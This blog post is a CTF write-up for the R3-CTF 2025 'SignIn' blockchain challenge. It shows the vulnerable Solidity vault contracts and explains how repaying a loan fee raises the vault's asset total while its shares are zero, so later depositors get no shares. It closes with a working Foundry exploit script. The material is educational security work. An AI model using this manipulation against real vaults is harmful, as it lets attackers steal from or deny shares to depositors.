+++
date = '2025-07-16T19:41:06+05:30'
draft = false
title = 'R3-CTF-2025-signin'
categories=["Blockchain"]
series=["R3-CTF-2025"]
tags=["Vault Inflation"]
+++

# Writeup for SignIn

### Challenge Description
In the world of digital currencies, every transaction holds secrets, and every vault has its own story...

**Author:** zeroc

### The Challenge

The below are source contracts

1. **Setup** contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Vault} from "./Vault.sol";
import {LING} from "./LING.sol";

contract Setup {
    Vault public vault;
    LING public ling;
    bool public claimed;
    bool public solved;
    constructor() {
        ling = new LING(1000 ether);
        vault = new Vault(ling);
    }

    function claim() external {
        if (claimed) {
            revert("Already claimed");
        }
        claimed = true;
        ling.transfer(msg.sender, 1 ether);
    }

    function solve() external {
        ling.approve(address(vault), 999 ether);
        vault.deposit(999 ether, address(this));
        if (vault.balanceOf(address(this)) >= 500 ether) {
            revert("Challenge not solved yet");
        }
        solved = true;
    }

    function isSolved() public view returns (bool) {
        return solved;
    }
}

```

2. **LING** contract

```solidity
//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import {ERC20} from "@signin/openzeppelin/contracts/token/ERC20/ERC20.sol";

contract LING is ERC20 {
    constructor(uint256 _initialSupply) ERC20("LING", "LING") {
        _mint(msg.sender, _initialSupply);
    }
}
```

3. **Vault** contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ERC20} from "@signin/openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Ownable} from "@signin/openzeppelin/contracts/access/Ownable.sol";
import {IERC4626} from "@signin/openzeppelin/contracts/interfaces/IERC4626.sol";
import {LING} from "./LING.sol";

contract Vault is Ownable, IERC4626, ERC20("LING VAULT", "vLING") {
    struct VaultAccount {
        uint256 amount;
        uint256 shares;
    }

    VaultAccount public totalAsset;
    LING ling;
    mapping(address => uint256) public borrowedAssets;
    uint256 public totalBorrowedAssets;

    constructor(LING _ling) Ownable(msg.sender) {
        ling = _ling;
    }

    function asset() external view returns (address assetTokenAddress) {
        assetTokenAddress = address(ling);
    }

    function totalAssets() public view returns (uint256 totalManagedAssets) {
        totalManagedAssets = totalAsset.amount - totalBorrowedAssets;
    }

    function convertToShares(
        uint256 assets
    ) public view returns (uint256 shares) {
        if (totalAsset.amount == 0) {
            shares = assets;
        } else {
            shares = (assets * totalAsset.shares) / totalAsset.amount;
        }
    }

    function convertToAssets(
        uint256 shares
    ) public view returns (uint256 assets) {
        if (totalAsset.shares == 0) {
            assets = shares;
        } else {
            assets = (shares * totalAsset.amount) / totalAsset.shares;
        }
    }

    function maxDeposit(
        address /* receiver */
    ) public pure returns (uint256 maxAssets) {
        return type(uint256).max;
    }

    function previewDeposit(
        uint256 assets
    ) external view returns (uint256 shares) {
        shares = convertToShares(assets);
    }

    function deposit(
        uint256 assets,
        address receiver
    ) external returns (uint256) {
        if (assets == 0) {
            revert("zero assets");
        }
        uint256 shares = convertToShares(assets);

        totalAsset.amount += assets;
        totalAsset.shares += shares;
        ling.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);

        emit Deposit(msg.sender, receiver, assets, shares);
        return shares;
    }

    function maxMint(
        address /* receiver */
    ) external pure returns (uint256 maxShares) {
        return type(uint256).max;
    }

    function previewMint(
        uint256 shares
    ) external view returns (uint256 assets) {
        assets = convertToAssets(shares);
    }

    function mint(
        uint256 shares,
        address receiver
    ) external returns (uint256 assets) {
        if (shares == 0) {
            revert("zero shares");
        }
        assets = convertToAssets(shares);

        totalAsset.amount += assets;
        totalAsset.shares += shares;
        ling.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);

        emit Deposit(msg.sender, receiver, assets, shares);
        return assets;
    }

    function maxWithdraw(
        address owner
    ) external view returns (uint256 maxAssets) {
        uint256 shares = balanceOf(owner);
        maxAssets = convertToAssets(shares);
    }

    function previewWithdraw(
        uint256 assets
    ) external view returns (uint256 shares) {
        shares = convertToShares(assets);
    }

    function withdraw(
        uint256 assets,
        address receiver,
        address owner
    ) external returns (uint256 shares) {
        if (assets == 0) {
            revert("zero assets");
        }
        shares = convertToShares(assets);
        if (shares > balanceOf(owner)) {
            revert("insufficient shares");
        }

        if (msg.sender != owner) {
            uint256 allowed = allowance(owner, msg.sender);
            if (allowed < shares) {
                revert("insufficient allowance");
            }
            _approve(owner, msg.sender, allowed - shares);
        }

        _burn(owner, shares);
        totalAsset.amount -= assets;
        totalAsset.shares -= shares;
        ling.transfer(receiver, assets);

        emit Withdraw(msg.sender, receiver, owner, assets, shares);
        return shares;
    }

    function maxRedeem(
        address owner
    ) external view returns (uint256 maxShares) {
        return balanceOf(owner);
    }

    function previewRedeem(
        uint256 shares
    ) external view returns (uint256 assets) {
        assets = convertToAssets(shares);
    }

    function redeem(
        uint256 shares,
        address receiver,
        address owner
    ) external returns (uint256 assets) {
        if (shares > balanceOf(owner)) {
            revert("insufficient shares");
        }
        assets = convertToAssets(shares);

        if (msg.sender != owner) {
            uint256 allowed = allowance(owner, msg.sender);
            if (allowed < shares) {
                revert("insufficient allowance");
            }
            _approve(owner, msg.sender, allowed - shares);
        }

        _burn(owner, shares);
        totalAsset.amount -= assets;
        totalAsset.shares -= shares;
        ling.transfer(receiver, assets);

        emit Withdraw(msg.sender, receiver, owner, assets, shares);
        return assets;
    }

    function borrowAssets(uint256 amount) external {
        if (amount == 0) {
            revert("zero amount");
        }
        if (amount > totalAssets()) {
            revert("insufficient balance");
        }
        borrowedAssets[msg.sender] += amount;
        totalBorrowedAssets += amount;
        ling.transfer(msg.sender, amount);
    }

    function repayAssets(uint256 amount) external {
        if (amount == 0) {
            revert("zero amount");
        }
        if (borrowedAssets[msg.sender] < amount) {
            revert("invalid amount");
        }
        uint256 fee = (amount * 1) / 100;
        borrowedAssets[msg.sender] -= amount;
        totalBorrowedAssets -= amount;
        totalAsset.amount += fee;
        ling.transferFrom(msg.sender, address(this), amount + fee);
    }
}
```

```solidity
    function solve() external {
        ling.approve(address(vault), 999 ether);
        vault.deposit(999 ether, address(this));
        if (vault.balanceOf(address(this)) >= 500 ether) {
            revert("Challenge not solved yet");
        }
        solved = true;
    }
```

Our goal is to make the `Setup::isSolved` function return `true`. This function returns `true` if the `solved` variable is set to `true`. We can set `solved` to `true` by calling `Setup::solve`. The `Setup::solve` function attempts to deposit `999e18` **LING** tokens into the vault. If, during this deposit, the number of shares received by the `Setup` contract is **less than 500 ether**, the `solved` variable will be set to true.

By looking at this, we can understand that the challenge is related to a **vault inflation attack**. If you're unfamiliar with vault inflation attacks, I recommend reading [Mixbytes](https://mixbytes.io/blog/overview-of-the-inflation-attack) blog post. If you're not familiar with ERC-4626 vaults, I suggest checking out [Rareskills](https://rareskills.io/post/erc4626) blog post.


### The Exploit

```solidity
    function deposit(
        uint256 assets,
        address receiver
    ) external returns (uint256) {
        if (assets == 0) {
            revert("zero assets");
        }
        uint256 shares = convertToShares(assets);

        totalAsset.amount += assets;
        totalAsset.shares += shares;
        ling.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);

        emit Deposit(msg.sender, receiver, assets, shares);
        return shares;
    }
```

The above function is from the `Vault` contract. When the `Setup::solve` function calls `Vault::deposit`, the number of shares the `Setup` contract receives is determined by the `Vault::convertToShares` function.    
Now, let's take a look at `Vault::convertToShares`.

```solidity

    function convertToShares(
        uint256 assets
    ) public view returns (uint256 shares) {
        if (totalAsset.amount == 0) {
            shares = assets;
        } else {
            shares = (assets * totalAsset.shares) / totalAsset.amount;
        }
    }
```

The `Vault::convertToShares` function logic looks correct. It uses a struct named `totalAsset`, which is an instance of `VaultAccount`. This struct has two members: `amount` and `shares`.
- `amount` represents the total assets deposited into the vault.
- `shares` is the total number of shares minted for those assets.
Since the contract uses this struct to track deposits, we **cannot manipulate the vault through direct donations**.According to the formula, depositing 999 ether will result in **less than 500 shares** only if:
- `totalAsset.amount > 0` and `totalAsset.amount > 999 ether`, or
- `totalAsset.amount > 0` and `totalAsset.shares == 0`.

However, we can’t make `totalAsset.amount > 999 ether` because we only have `1e18 LING` tokens available. So, our only option is to make `totalAsset.shares == 0`. But this won’t happen just by depositing and redeeming shares — because that always updates both amount and shares. For this to work, there must be some function in the contract that increases `totalAsset.amount` without updating `totalAsset.shares` — meaning it calculates the amount incorrectly.

If we look closely, we can see that the Vault also supports lending, and when someone borrows, they have to pay a fee. The following functions are related to the lending logic:


```solidity
    function borrowAssets(uint256 amount) external {
        if (amount == 0) {
            revert("zero amount");
        }
        if (amount > totalAssets()) {
            revert("insufficient balance");
        }
        borrowedAssets[msg.sender] += amount;
        totalBorrowedAssets += amount;
        ling.transfer(msg.sender, amount);
    }

    function repayAssets(uint256 amount) external {
        if (amount == 0) {
            revert("zero amount");
        }
        if (borrowedAssets[msg.sender] < amount) {
            revert("invalid amount");
        }
        uint256 fee = (amount * 1) / 100;
        borrowedAssets[msg.sender] -= amount;
        totalBorrowedAssets -= amount;
        totalAsset.amount += fee;
        ling.transferFrom(msg.sender, address(this), amount + fee);
    }
```

Our goal is to update only the `totalAsset.amount` without changing `totalAsset.shares`, and the `Vault::repayAssets` function allows us to do exactly that. When someone borrows and repays their debt, they pay an extra 1% fee, which is added directly to `totalAsset.amount`.

To exploit this, we start by depositing a small amount, like 1000 wei LING, then borrow 1000 wei LING, and redeem our 1000 shares to get back the 1000 tokens. This action reduces totalAsset.shares to zero. Next, when we repay the borrowed 1000 LING plus the 1% fee (totaling 1010 wei), the `totalAsset.amount` increases to 1010 while `totalAsset.shares` stays at zero.

Now, when someone calls `Vault::deposit`, the shares they receive are calculated as `(assets * totalAsset.shares) / totalAsset.amount`. Since `totalAsset.shares` is zero, the result is zero shares. So, when the `Setup` contract deposits 999e18 LING, it receives zero shares, which is less than 500 ether, and the `solved` flag is set to true.

However, there is a catch. We only deposited 1000 wei LING, but we are trying to withdraw 2000 wei LING — 1000 by borrowing and 1000 by redeeming shares. Borrowing works fine, but when redeeming, the vault won’t have enough tokens to transfer back, causing an error. To fix this, we need to donate some LING tokens directly to the vault contract to ensure it has enough balance for redemption.


The below is the exploit script:

```solidity
//SPDX-License-Identifier:MIT
pragma solidity ^0.8.20;

import {Script, console} from "forge-std/Script.sol";
import {Setup,Vault,LING} from "src/signin/Setup.sol";

contract Solve is Script {
    function run() public {
        vm.startBroadcast();
        Setup setup = Setup(address(0xdd154d7ff043F9DDb8029D888208fE780cC8D9b1));
        Vault vault=setup.vault();
        LING ling=setup.ling();
        setup.claim();
        ling.approve(address(vault),1000);
        vault.deposit(1000, msg.sender);
        vault.borrowAssets(1000);
        ling.transfer(address(vault),1000);
        vault.redeem(1000, msg.sender, msg.sender);
        ling.approve(address(vault),1010);
        vault.repayAssets(1000);
        setup.solve();
        console.log(setup.isSolved());
        vm.stopBroadcast();
    }
}
```

### Note
If you want to try this challenge locally, clone the [challenges repository](https://github.com/s4bot3ur/Blockchain-Challenges) and follow the [setup guide](https://github.com/s4bot3ur/Blockchain-Challenges/tree/main/EVM/2025). This setup is available only for 2025 challenge solutions. If you face any issues feel free to reach out on [discord](https://discord.com/users/666925625650446357) :)

<p style="text-align:center;">***<strong>Hope you enjoyed this write-up. Keep on hacking and learning!</strong>***</p>